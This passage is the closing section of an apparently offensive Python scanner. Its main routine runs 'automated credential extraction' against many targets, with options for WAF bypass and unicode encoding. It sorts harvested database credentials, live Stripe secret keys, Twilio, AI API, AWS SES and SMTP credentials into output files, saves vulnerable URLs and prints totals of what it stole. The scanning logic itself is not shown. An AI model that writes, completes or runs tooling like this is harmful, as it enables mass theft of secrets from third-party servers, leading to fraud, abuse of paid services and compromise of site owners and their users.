    checkpoint_state['waf_bypass_size_kb'] = waf_bypass_size_kb
    checkpoint_state['unicode_encode'] = unicode_encode
    
    # Output files
    output_files = {
        'db': f"{output_dir}/DB-Credentials.txt",
        'stripe': f"{output_dir}/Stripe-Key.txt",
        'twilio': f"{output_dir}/Twilio.txt",
        'ai': f"{output_dir}/AI-Key.txt",
        'ses': f"{output_dir}/AWS-SES.txt",
        'smtp': f"{output_dir}/SMTP.txt",
        'vuln': f"{output_dir}/Vulnerable.txt"
    }
    
    # Create output files if they don't exist (don't clear on resume)
    if not skip_urls:
        for key, filepath in output_files.items():
            open(filepath, 'w').close()
    
    print(f"\n{Colors.CYAN}[*] Output directory: {output_dir}/{Colors.RESET}")
    print(f"{Colors.CYAN}[*] Starting automated credential extraction...{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Press CTRL+C to save progress and exit{Colors.RESET}")
    print(f"{Colors.DARK_GREEN}{'='*70}{Colors.RESET}\n")
    
    try:
        # Run scan
        results, stats = await scan_targets(targets, waf_bypass, waf_bypass_size_kb, unicode_encode, output_files, skip_urls)
        
        # Save vulnerable URLs
        with open(output_files['vuln'], 'w') as f:
            for r in results:
                if r['vulnerable']:
                    f.write(f"{r['url']}\n")
        
        # Remove checkpoint on successful completion
        try:
            os.remove(PID_RESTORE)
        except:
            pass
        
        # Print summary
        print(f"\n{Colors.DARK_GREEN}{'='*70}{Colors.RESET}")
        print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}")
        print(f"                         SCAN COMPLETE")
        print(f"{Colors.DARK_GREEN}{'='*70}{Colors.RESET}")
        print(f"{Colors.WHITE}Total Targets Scanned:  {len(targets)}{Colors.RESET}")
        print(f"{Colors.BRIGHT_GREEN}Vulnerable Targets:     {stats['vuln']}{Colors.RESET}")
        print(f"{Colors.CYAN}Database Credentials:   {stats['db']}{Colors.RESET}")
        print(f"{Colors.MAGENTA}Stripe Keys (sk_live_): {stats['stripe']}{Colors.RESET}")
        print(f"{Colors.BLUE}Twilio Credentials:     {stats['twilio']}{Colors.RESET}")
        print(f"{Colors.GREEN}AI API Keys:            {stats['ai']}{Colors.RESET}")
        print(f"{Colors.AMBER}AWS SES Credentials:    {stats['ses']}{Colors.RESET}")
        print(f"{Colors.DARK_GREEN}SMTP Credentials:       {stats['smtp']}{Colors.RESET}")
        print(f"\n{Colors.BRIGHT_GREEN}Output Directory: {output_dir}/{Colors.RESET}")
        print(f"{Colors.CYAN}Files:{Colors.RESET}")
        for key, filepath in output_files.items():
            print(f"  {Colors.WHITE}• {filepath}{Colors.RESET}")
    
    except KeyboardInterrupt:
        save_checkpoint()
        sys.exit(0)

if __name__ == '__main__':
    asyncio.run(main())
